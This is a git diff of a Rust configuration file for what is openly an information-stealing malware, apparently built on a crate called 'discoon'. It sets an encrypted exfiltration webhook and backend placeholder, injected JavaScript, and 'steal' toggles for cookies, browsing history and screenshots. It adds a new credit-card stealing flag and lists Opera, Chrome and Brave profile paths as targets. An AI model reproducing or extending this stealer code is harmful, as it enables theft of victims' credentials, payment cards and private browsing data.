@@ -1,5 +1,3 @@
-#![allow(dead_code)]
-
 // Webhook that will be encrypted on runtime using a macro
 pub const ENCRYPTED_WEBHOOK: &str = discoon::encrypt!("[ENTER-WEBHOOK]");
 
@@ -21,6 +19,9 @@ pub const STEAL_COOKIES: bool = false;
 // Steal browsing history (self explanatory)
 pub const STEAL_HISTORY: bool = false;
 
+// Steal credit cards (self explanatory)
+pub const STEAL_CREDIT_CARDS: bool = false;
+
 // Takes a screenshot (self explanatory)
 pub const SCREENSHOT: bool = false;
 
@@ -34,7 +35,7 @@ pub const BACKEND: &'static str = "[ENTER-BACKEND]";
 pub const INJECT_CODE: &'static str = include_str!("../assets/inject.js");
 
 // Browsers to steal from
-pub const BROWSER_TARGETS: &'static [&'static str] = &[
+pub const CHROMUNIUM_TARGETS: &'static [&'static str] = &[
     "Roaming\\Opera Software\\Opera Stable",
     "Local\\Google\\Chrome",
     "Local\\BraveSoftware\\Brave-Browser",
